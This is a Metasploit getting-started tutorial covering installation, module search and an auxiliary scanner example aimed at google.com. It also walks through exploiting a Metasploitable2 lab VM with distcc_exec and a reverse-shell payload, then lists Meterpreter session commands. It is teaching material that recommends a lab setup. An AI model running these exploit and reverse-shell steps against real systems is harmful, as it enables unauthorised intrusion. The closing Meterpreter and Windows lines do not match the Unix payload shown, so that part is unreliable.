Installing Metasploit on Linux / macOS

The following script invocation will import the Rapid7 signing key and setup the package for supported Linux and macOS systems:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall

Once installed, you can launch msfconsole as /opt/metasploit-framework/bin/msfconsole from a terminal window, or depending on your environment, it may already be in your path and you can just run it directly.

Assuming you have installed Metasploit, either with the official Rapid7 nightly installers or through Kali, you can use the msfconsole command to open Metasploit:

Finding modules

Metasploit is based around the concept of modules. The most commonly used module types are:

    Auxiliary - Auxiliary modules do not exploit a target, but can perform data gathering or administrative tasks
    Exploit - Exploit modules leverage vulnerabilities in a manner that allows the framework to execute arbitrary code on the target host
    Payloads - Arbitrary code that can be executed on a remote target to perform a task, such as creating users, opening shells, etc
    Post - Post modules are used after a machine has been compromised. They perform useful tasks such as gathering, collecting, or enumerating data from a session.

You can use the search command to search for modules:

You can use a Metasploit module by specifying the full module name. The prompt will be updated to indicate the currently active module:

msf6 > use auxiliary/scanner/http/title
msf6 auxiliary(scanner/http/title) > 

Running Auxiliary modules

Auxiliary modules do not exploit a target, but can perform data gathering or administrative tasks. For instance, a module extracting the HTTP title from a server:

msf6 > use auxiliary/scanner/http/title
msf6 auxiliary(scanner/http/title) > 

Each module offers configurable options which can be viewed with the show options, or aliased options, command

To set a module option, use the set command. We will set the RHOST option - which represents the target host(s) that the module will run against:

msf6 auxiliary(scanner/http/title) > set RHOSTS google.com
RHOSTS => google.com

The run command will run the module against the target, showing the target’s HTTP title:

Running exploit modules

Exploit modules require a vulnerable target. It is recommended to set up your own local test environment to run modules against. For instance in a Virtual Machine, or with Docker. There are multiple pre-built vulnerable test environments including:

    Metasploitable2
    Metasploitable3

For instance - targeting a vulnerable Metasploitable2 VM and using the unix/misc/distcc_exec module:

msf6 > use unix/misc/distcc_exec
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(unix/misc/distcc_exec) > 

Exploit modules will generally at a minimum require the following options to be set:

    RHOST - The remote target host address
    LHOST - The listen address. Important This may need to be set to your tun0 IP address or similar, if you are connecting to your target over a VPN
    PAYLOAD - The code to be executed after an exploit is successful. For instance creating a user, or a Metasploit session. Often this can be left as the default value, but may sometimes require configuration

Each module offers configurable options which can be viewed with the show options, or aliased options, command

For this scenario you can manually set each of the required option values (RHOST, LHOST, and optionally PAYLOAD):

msf6 exploit(unix/misc/distcc_exec) > set rhost 192.168.123.133
rhost => 192.168.123.133
msf6 exploit(unix/misc/distcc_exec) > set lhost 192.168.123.1
lhost => 192.168.123.1
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse

The run command will run the module against the target, there is also an aliased exploit command which will perform the same action:

To see all possible Meterpreter commands, type help.
Don’t do this now, but you can close a meterpreter session with the exit command. Alternatively, you can suspend your session so you can return to it again later with the background command (or by pressing ctrl+z).
Type sysinfo to see information about the compromised system.

Type getuid to see which Windows user account your session is running as
